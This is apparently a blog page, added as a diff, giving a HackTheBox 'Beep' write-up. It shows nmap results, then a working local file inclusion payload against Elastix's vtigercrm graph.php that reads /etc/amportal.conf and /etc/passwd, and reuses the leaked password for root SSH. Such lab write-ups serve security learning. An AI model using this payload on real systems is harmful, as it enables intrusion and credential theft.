@@ -1,0 +1,104 @@
+<!DOCTYPE html>
+
+
+<html lang="en">
+<meta http-equiv="Content-Security-Policy" content="default-src 'none'; script-src 'self'; style-src 'self' https://fonts.googleapis.com; img-src 'self'; font-src 'self' https://fonts.gstatic.com; connect-src 'self'; media-src 'self'; object-src 'self'; child-src 'self'; form-action 'none'; base-uri 'self'" />
+<meta http-equiv="X-XSS-Protection"  content="1;mode=block" always>
+<meta http-equiv="Referrer-Policy" content="no-referrer, strict-origin-when-cross-origin"><head>
+  <meta charset="utf-8">
+  <meta http-equiv="X-UA-Compatible" content="IE=edge">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no" />
+  <title>HackTheBox - Beep</title>
+ 
+
+  <link rel="stylesheet" type="text/css" href="/assets/main-hacker.css"></head>
+<body>
+    <div class="container"><header>
+  <div class="menu">
+    <ul>
+      <li class="menu-first-child">
+        <span>
+          [cyberRat@RedTeam]~$
+          <span class="blink">
+            █
+          </span>
+        </span>
+      </li>
+      <li>
+        <a href="/">Home</a>
+      </li>
+
+    
+      <li>
+        <a href="/brainbox/">/BrainBox</a>
+      </li> 
+      <li>
+        <a href="/resume/">/Resume</a>
+      </li>
+
+    </ul>
+  </div>
+</header>
+
+<main>
+      <p>Beep was a very easy box with not much to learn. Would have liked to see more complex methods included as the initial vector was different and could have led to more interesting things.</p>
+
+<h1 id="nmap-scan">Nmap scan</h1>
+<div class="language-console highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="go">PORT      STATE SERVICE    VERSION
+22/tcp    open  ssh        OpenSSH 4.3 (protocol 2.0)
+| ssh-hostkey:
+|   1024 ad:ee:5a:bb:69:37:fb:27:af:b8:30:72:a0:f9:6f:53 (DSA)
+|_  2048 bc:c6:73:59:13:a1:8a:4b:55:07:50:f6:65:1d:6d:0d (RSA)
+25/tcp    open  smtp       Postfix smtpd
+|_smtp-commands: beep.localdomain, PIPELINING, SIZE 10240000, VRFY, ETRN, ENHANCEDSTATUSCODES, 8BITMIME, DSN,
+80/tcp    open  http       Apache httpd 2.2.3
+|_http-server-header: Apache/2.2.3 (CentOS)
+|_http-title: Did not follow redirect to https://10.10.10.7/
+110/tcp   open  pop3       Cyrus pop3d 2.3.7-Invoca-RPM-2.3.7-7.el5_6.4
+|_pop3-capabilities: UIDL APOP LOGIN-DELAY(0) STLS AUTH-RESP-CODE EXPIRE(NEVER) TOP IMPLEMENTATION(Cyrus POP3 server v2) USER RESP-CODES PIPELINING
+</span><span class="gp">111/tcp   open  rpcbind    2 (RPC #</span>100000<span class="o">)</span>
+<span class="go">| rpcinfo:
+|   program version   port/proto  service
+|   100000  2            111/tcp  rpcbind
+|   100000  2            111/udp  rpcbind
+|   100024  1            743/udp  status
+|_  100024  1            746/tcp  status
+143/tcp   open  imap       Cyrus imapd 2.3.7-Invoca-RPM-2.3.7-7.el5_6.4
+|_imap-capabilities: Completed OK RENAME URLAUTHA0001 IMAP4 NO X-NETSCAPE QUOTA SORT CONDSTORE MULTIAPPEND UNSELECT IDLE CATENATE IMAP4rev1 ACL THREAD=REFERENCES LITERAL+ RIGHTS=kxte ATOMIC NAMESPACE BINARY ID LIST-SUBSCRIBED SORT=MODSEQ MAILBOX-REFERRALS CHILDREN ANNOTATEMORE UIDPLUS THREAD=ORDEREDSUBJECT STARTTLS LISTEXT
+443/tcp   open  ssl/http   Apache httpd 2.2.3 ((CentOS))
+| http-robots.txt: 1 disallowed entry
+|_/
+|_http-server-header: Apache/2.2.3 (CentOS)
+|_http-title: Elastix - Login page
+| ssl-cert: Subject: commonName=localhost.localdomain/organizationName=SomeOrganization/stateOrProvinceName=SomeState/countryName=--
+| Not valid before: 2017-04-07T08:22:08
+|_Not valid after:  2018-04-07T08:22:08
+</span><span class="gp">|_ssl-date: 2018-10-31T09:44:22+00:00;</span><span class="w"> </span><span class="nt">-2h00m46s</span> from scanner time.
+<span class="go">993/tcp   open  ssl/imap   Cyrus imapd
+|_imap-capabilities: CAPABILITY
+995/tcp   open  pop3       Cyrus pop3d
+3306/tcp  open  mysql      MySQL (unauthorized)
+4445/tcp  open  upnotifyp?
+10000/tcp open  http       MiniServ 1.570 (Webmin httpd)
+</span><span class="gp">|_http-title: Site doesn't have a title (text/html;</span><span class="w"> </span><span class="nv">Charset</span><span class="o">=</span>iso-8859-1<span class="o">)</span><span class="nb">.</span>
+<span class="go">No exact OS matches for host
+</span></code></pre></div></div>
+
+<h1 id="exploitation">Exploitation</h1>
+<p>We can see from the nmap scan and from navigating the page that the webserver is running elastix. A exploit-db search for elastix returns a local file inclusion that should reveal a user login and password from a config file.</p>
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>Elastix 2.2.0 - 'graph.php' Local File Inclusion | exploits/php_webapps/37637.pl
+</code></pre></div></div>
+<p>Reading the exploit and grabbing the payload we can navigate back to the page and read the config file with the LFI</p>
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>/vtigercrm/graph.php?current_language=../../../../../../../..//etc/amportal.conf%00&amp;module=Accounts&amp;action
+</code></pre></div></div>
+<p>There are passwords in the config file as expected, next we can change the LFI to point to /etc/passwd to check for user accounts to try ssh with.</p>
+
+<p>sshing into the box as root with the password from the config file works and we can collect our root and user flags.</p>
+
+
+    </main><footer>
+  <a href="https://twitter.com/ratilovich">Twitter</a> 
+</footer>
+</div>
+  </body>
+</html>
